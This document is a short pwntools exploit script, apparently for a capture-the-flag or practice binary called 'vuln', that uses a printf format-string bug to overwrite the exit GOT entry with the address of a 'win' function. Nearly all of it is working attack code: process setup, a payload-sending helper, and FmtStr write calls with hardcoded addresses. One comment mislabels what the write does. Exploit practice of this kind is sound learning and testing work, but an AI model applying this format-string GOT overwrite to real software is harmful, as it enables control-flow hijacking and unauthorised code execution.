#!/usr/bin/python3
from pwn import *
# Assume a process that reads a string
# and gives this string as the first argument
# of a printf() call
# It do this indefinitely
elf = context.binary = ELF("vuln")
io = process(elf.path)

gs = '''
b greet
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


io = start()
# Function called in order to send a payload
def send_payload(payload):
        log.info("payload = %s" % repr(payload))
        io.sendline(payload)
        return io.recv()

#exit_got = 0804c010
#win_addr = 080491dd

# Create a FmtStr object and give to him the function
format_string = FmtStr(execute_fmt=send_payload)
#log.info("Format string offset: %d", format_string.offset)
#format_string.write(0x0, 0x1337babe) # write 0x1337babe at 0x0
format_string.write(0x0804c010, p32(0x080491dd)) # write 0x0 at 0x1337babe
#format_string.write(0x0804c010, 0x91dd)
#format_string.write(0x0804c012, 0x0804)

format_string.execute_writes()

